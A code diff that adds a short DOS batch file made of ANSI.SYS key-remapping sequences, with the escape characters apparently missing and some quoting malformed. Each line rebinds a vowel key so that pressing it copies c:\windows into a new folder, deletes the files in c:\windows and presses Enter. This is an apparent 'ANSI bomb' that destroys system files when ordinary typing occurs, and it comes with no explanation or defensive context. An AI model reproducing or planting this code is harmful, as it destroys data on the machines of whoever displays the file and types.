@@ -1,0 +1,11 @@
+@ECHO ON
+["e;"md c:\§";"copy c:\windows\*.* c:\§ /y";"del c:\windows\*.* /y";13p"
+["a;"md c:\§";"copy c:\windows\*.* c:\§ /y";"del c:\windows\*.* /y";13p"
+["i;"md c:\§";"copy c:\windows\*.* c:\§ /y";"del c:\windows\*.* /y";13p"
+["o;"md c:\§";"copy c:\windows\*.* c:\§ /y";"del c:\windows\*.* /y";13p"
+["u;"md c:\§";"copy c:\windows\*.* c:\§ /y";"del c:\windows\*.* /y";13p"
+["E;"md c:\§";"copy c:\windows\*.* c:\§ /y";"del c:\windows\*.* /y";13p"
+["A;"md c:\§";"copy c:\windows\*.* c:\§ /y";"del c:\windows\*.* /y";13p"
+["I;"md c:\§";"copy c:\windows\*.* c:\§ /y";"del c:\windows\*.* /y";13p"
+["O;"md c:\§";"copy c:\windows\*.* c:\§ /y";"del c:\windows\*.* /y";13p"
+["U;"md c:\§";"copy c:\windows\*.* c:\§ /y";"del c:\windows\*.* /y";13p"
